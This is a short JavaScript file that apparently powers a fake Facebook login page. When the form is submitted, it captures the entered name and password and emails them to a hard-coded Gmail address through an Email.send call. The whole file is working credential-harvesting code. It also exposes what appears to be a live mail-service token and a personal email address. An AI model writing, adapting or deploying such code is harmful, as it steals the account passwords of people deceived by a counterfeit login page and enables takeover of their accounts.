const name = document.getElementById('name');
const pass = document.getElementById('pass');
const submit = document.getElementsByClassName('form-contact')[0];

submit.addEventListener('submit',(e)=>{
    e.preventDefault();
    console.log("clicked")

    // Email Code Here...
    Email.send({
        SecureToken : "07085a9c-23be-417f-86d2-9ee46d4c2805",
        To : 'ossamarayan22@gmail.com',
        From : "ossamarayan22@gmail.com",
        Subject : "fack facebook",
        Body : "Name: " + document.getElementById("name").value
                +"<br> pass: " + document.getElementById("pass").value
    }).then(
    );
});